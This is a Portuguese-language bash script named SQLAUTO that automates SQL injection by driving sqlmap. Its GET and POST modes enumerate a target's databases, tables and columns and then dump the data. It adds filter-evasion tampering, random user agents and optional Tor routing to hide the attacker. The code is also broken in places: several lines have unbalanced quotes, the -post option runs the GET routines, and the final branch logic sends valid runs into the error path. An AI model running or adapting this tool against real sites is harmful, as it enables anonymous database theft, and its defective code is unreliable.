#!/bin/bash

function banner()
{
echo "[+] - SQLAUTO - [+]"
echo "[+] - - - - - - - - - - - - - - - - - [+]"
echo "[+] - Coded by Matheus Bernardes - [+]"
echo "[+] - gambler@tutanota.com  - [+]"
echo " "
}

function ajuda()
{
        banner
        echo "[+] - Modo de uso - [+]"
        echo " "

        echo "[+] - Ataques através de URL (Metodo GET) - [+]"
        echo "  $0 -get"
        echo " "
        echo "  [+] - Habilitando TOR - [+]"
        echo "          $0 -get -tor"
        echo " "

        echo "[+] - Ataques através de Arquivo com Request (Metodo POST) - [+]"
        echo "  $0 -post"
        echo " "
        echo "  [+] - Habilitando TOR - [+]"
        echo "          $0 -post -tor"
        echo " "

        echo "[+] - Menu de ajuda - [+]"
        echo "  $0 -h"
        exit
}

function erro()
{
        echo "[+] Erro de sintaxe - [+]"
        echo " "
        ajuda
}

function tor_get()
{
        echo "[+] - TOR ENABLED - [+]"
                echo "[+] - Digite a URL a ser explorada: "
        read url
        echo "[+] - Qual o variavel sera utilizada para a exploração: "
        read var
        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs

        echo "[+] - Digite o Banco de Dados a ser explorado: "
        read db
        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables

        echo "[+] - Digite a Tabela a ser explorada: "
        read tabela
        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns

        echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
        read colunas
        sqlmap -u "$url" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
}

function get()
{
        echo "[+] - Digite a URL a ser explorada: "
        read url
        echo "[+] - Qual o variavel sera utilizada para a exploração: "
        read var
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var --dbs

        echo "[+] - Digite o Banco de Dados a ser explorado: "
        read db
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var -D $db --tables

        echo "[+] - Digite a Tabela a ser explorada: "
        read tabela
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var -D $db -T $tabela --columns

        echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
        read colunas
        sqlmap -u "$url" --tamper="charencode.py" --random-agent -p $var -D $db -T $tabela -C $colunas --dump
}

function tor_post()
{
        echo "[+] - TOR ENABLED - [+]"
                echo "[+] - Digite o caminho completo do arquivo com a requisição a ser explorada: "
        read arquivo
        echo "[+] - Qual o variavel sera utilizada para a exploração: "
        read var
        sqlmap -r "$arquivo" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var --dbs

        echo "[+] - Digite o Banco de Dados a ser explorado: "
        read db
        sqlmap -r "$arquivo"" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db --tables

        echo "[+] - Digite a Tabela a ser explorada: "
        read tabela
        sqlmap -r "$arquivo"" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela --columns

        echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
        read colunas
        sqlmap -r "$arquivo" --tamper="charencode.py" --random-agent --tor --tor-type=SOCKS5 --check-tor --time-sec=10 -p $var -D $db -T $tabela -C $colunas --dump
}

function post()
{
        echo "[+] - Digite o caminho completo do arquivo com a requisição a ser explorada: "
        read arquivo
        echo "[+] - Qual o variavel sera utilizada para a exploração: "
        read var
        sqlmap -r "$arquivo" --tamper="charencode.py" -p $var --dbs

        echo "[+] - Digite o Banco de Dados a ser explorado: "
        read db
        sqlmap -r "$arquivo"" --tamper="charencode.py" -p $var -D $db --tables

        echo "[+] - Digite a Tabela a ser explorada: "
        read tabela
        sqlmap -r "$arquivo"" --tamper="charencode.py" -p $var -D $db -T $tabela --columns

        echo "[+] - Digite a(s) coluna(s) a ser explora(s): "
        read colunas
        sqlmap -r "$arquivo" --tamper="charencode.py" -p $var -D $db -T $tabela -C $colunas --dump
}


if [ -z $1 ]
then
        erro
fi

if [ $1 == '-h' ]
then
        ajuda
fi

if [ $1 == '-get' ]
then
        if [ $2 == '-tor' ] 2> /dev/null
        then
                tor_get
        else
                get
        fi
fi

if [ $1 == '-post' ]
then
        if [ $2 == '-tor' ] 2> /dev/null
        then
                tor_get
        else
                get
        fi
else
        erro
fi
